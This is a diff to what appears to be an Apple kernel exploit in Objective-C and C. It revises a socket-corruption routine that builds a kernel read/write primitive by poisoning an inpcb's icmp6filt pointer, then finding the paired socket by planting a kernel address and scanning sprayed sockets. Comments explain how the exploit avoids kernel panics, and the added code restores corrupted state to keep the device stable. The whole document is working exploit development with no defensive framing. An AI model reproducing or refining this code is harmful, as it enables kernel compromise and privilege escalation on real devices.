@@ -677,17 +677,54 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     fflush(stdout);
 
     if (gso == 0 && *(uint64_t*)gd == 0x4141414141414141ULL) {
-        // SINGLE-SOCKET primitive: control's icmp6filt IS the read/write port
-        // (setsockopt(control) writes to rw_pcb+0x138, getsockopt(control)
-        // reads from it), so rwSocket = controlSocket. The reference instead
-        // uses socketPorts[csi+1] as rwSocket, but that socket's inpcb is NOT
-        // necessarily inpNext on this kernel, so getsockopt(rw) read through
-        // its own NULL icmp6filt and returned the all-FF default (observed).
-        controlSocket = sock;
-        rwSocket = sock;
-        printf("[+] early KRW confirmed (single-socket rw)\n");
-        fflush(stdout);
-        return 0;
+        // Corruption landed: control's icmp6filt -> rw_pcb+0x138. The KRW
+        // primitive needs a second socket whose inpcb IS rw_pcb (so its
+        // icmp6filt field lives at rw_pcb+0x138 and set_kaddr re-points it to
+        // `where`). The reference assumes that socket is socketPorts[csi+1],
+        // which is WRONG on this kernel (validated runs failed), so we identify
+        // it empirically.
+        //
+        // Method: plant a VALID kernel pointer -- rw's own inp_gencnt field,
+        // rw_pcb+0x78 -- into the rw icmp6filt slot (rw_pcb+0x138) via
+        // control's setsockopt, then scan for the socket whose getsockopt
+        // returns that gencnt:
+        //   - rw owner : derefs rw_pcb+0x78 -> returns rw's inp_gencnt, one of
+        //                our sprayed gencnts (socketPcbIds)
+        //   - everyone : NULL icmp6filt -> all-ones default (not a gencnt)
+        //   - control  : skipped below
+        // We deliberately do NOT fault the rw socket with an invalid VA (e.g.
+        // the 0x4141.. marker): getsockopt's copyout would kernel-fault on the
+        // bad source pointer and panic the device. A live inpcb-interior VA
+        // keeps every getsockopt in this scan safe. This scan is topology-proof
+        // (does not assume csi+1).
+        uint8_t pmark[0x20]; memset(pmark, 0xff, 0x20);
+        *(uint64_t*)pmark = inpNext + 0x78;
+        setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, pmark, 0x20);
+        NSMutableSet *gset = [NSMutableSet setWithArray:(NSMutableArray*)socketPcbIds];
+        int rwIdx = -1;
+        NSUInteger nports = [socketPorts count];
+        for (NSUInteger j = 0; j < nports && rwIdx < 0; j++) {
+            if (j == (NSUInteger)csi) continue;
+            int tfd = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[j] unsignedLongLongValue]);
+            if (tfd < 0) continue;
+            uint8_t tgd[0x20]; socklen_t tsl = 0x20;
+            int tgso = getsockopt(tfd, IPPROTO_ICMPV6, ICMP6_FILTER, tgd, &tsl);
+            close(tfd);
+            if (tgso != 0) continue;
+            uint64_t t0; memcpy(&t0, tgd, 8);
+            if ([gset containsObject:@(t0)]) { rwIdx = (int)j; break; }
+        }
+        if (rwIdx < 0) {
+            printf("[-] early KRW: no socket returned a sprayed gencnt from rw_pcb+0x78\n");
+            fflush(stdout);
+        } else {
+            controlSocket = sock;
+            rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[rwIdx] unsignedLongLongValue]);
+            [leakedPorts addObject:[(NSMutableArray*)socketPorts objectAtIndex:rwIdx]];
+            printf("[+] early KRW confirmed: control csi=%d, rw socket=%d\n", csi, rwIdx);
+            fflush(stdout);
+            return 0;
+        }
     }
 
     // PANIC MITIGATION: the corruption landed but the primitive is unusable
@@ -699,6 +736,14 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
     printf("[-] KRW check failed (gso=%d gd0=0x%llx), restoring control icmp6filt 0x%llx\n",
         gso, *(uint64_t*)gd, origFilt);
     fflush(stdout);
+    // Any write through control's still-poisoned icmp6filt landed in the rw
+    // owner's icmp6filt slot (rw_pcb+0x138): the marker test wrote 0x4141...,
+    // the rw scan planted rw_pcb+0x78. Zero that slot so the rw owner, if it is
+    // ever closed, cannot kfree() a poisoned pointer (observed panics). This is
+    // harmless even if the corruption did not land (control's icmp6filt is then
+    // NULL and setsockopt just allocates/zeroes a real filter).
+    uint8_t zf[0x20]; memset(zf, 0, 0x20);
+    setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, zf, 0x20);
     uint8_t *rst = malloc(OOB_SIZE);
     memcpy(rst, rBuf, OOB_SIZE);
     *(uint64_t*)((uintptr_t)rst + pso + OFFSET_ICMP6FILT) = origFilt;
